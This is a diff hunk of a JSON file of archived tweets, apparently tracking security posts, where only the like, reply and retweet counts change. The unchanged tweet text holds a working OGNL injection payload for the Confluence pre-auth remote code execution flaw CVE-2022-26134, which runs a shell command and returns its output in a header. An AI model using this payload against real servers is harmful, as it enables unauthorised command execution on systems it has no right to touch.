@@ -48,10 +48,10 @@
     "username": "Yalujb"
 }
 {
-    "tweetfavorites": 215,
+    "tweetfavorites": 219,
     "tweetquotes": 2,
-    "tweetreplies": 14,
-    "tweetretweets": 67,
+    "tweetreplies": 12,
+    "tweetretweets": 68,
     "tweettext": "CVE-2022-26134 PoC\nConfluence Pre-Auth RCE via OGNL Injection\n\n${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\"id\").getInputStream(),\"utf-8\")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(\"X-Cmd-Response\",#a))} https://t.co/cShTB7cQiF",
     "tweettime": "2022-08-26, 00:47:54",
     "tweeturl": "https://twitter.com/bughuntar/status/1562965024309596161",
